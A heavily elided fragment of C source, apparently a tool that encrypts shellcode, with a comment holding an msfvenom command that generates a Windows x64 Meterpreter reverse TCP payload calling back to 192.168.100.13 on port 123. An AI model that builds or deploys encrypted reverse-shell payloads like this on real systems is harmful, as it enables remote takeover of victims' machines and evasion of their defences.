...
/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f raw exitfunc=thread -o shellcode.bin*/
...
int main() {
    ...
    printf("[+] Encrypted data written to shellcode.bin\n");
